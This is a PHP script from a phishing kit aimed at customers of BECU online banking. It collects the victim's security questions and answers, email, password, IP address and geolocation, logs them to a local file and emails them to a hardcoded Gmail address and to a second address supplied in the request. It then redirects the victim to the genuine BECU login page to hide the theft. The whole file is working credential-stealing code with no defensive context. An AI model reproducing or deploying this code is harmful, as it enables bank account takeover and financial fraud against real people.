<?php
	
	$q1 = $_POST['q1'];
	$a1 = $_POST['an1'];
	$q2 = $_POST['q2'];
	$a2 = $_POST['an2'];
	$q3 = $_POST['q3'];
	$a3 = $_POST['an3'];
	$q4 = $_POST['q4'];
	$a4 = $_POST['an4'];
	$email  = $_POST['email'];
	$passwd = $_POST['password'];
	$serv = $_REQUEST['verify'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($q1 != null && $a1 != null && $q2 != null && $a2 != null && $q3 != null && $a3 != null && $q4 != null && $a4 != null && $email != null && $passwd != null){

    $message = "";
    $message .= "---|Blackfire007|---\n";
    $message .= "===== Question Details =====\n";
    $message .= "Questions 1	: ".$q1."\n";
    $message .= "Anwers 1       : ".$a1."\n";
    $message .= "Questions 2	: ".$q2."\n";
    $message .= "Answer	2       : ".$a2."\n";
    $message .= "Questions 3    : ".$q3."\n";
    $message .= "Answers 3      : ".$a3."\n";
    $message .= "Questions 4    : ".$q4."\n";
    $message .= "Answers 4      : ".$a4."\n";
    $message .= "===== Account Details =====\n";
    $message .= "Email	: ".$email."\n";
    $message .= "Passwd : ".$passwd."\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$handle = fopen("JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$send ="dvand848@gmail.com";

	$subject = "becu.org l $ip";
	$headers = "From: dvand848@gmail.com";

	{
	mail("$send",$subject,$message,$headers);
	mail("$serv",$subject,$message,$headers);
	}
	}
?>
<script>
	window.location="https://onlinebanking.becu.org/BECUBankingWeb/Login.aspx";
</script>

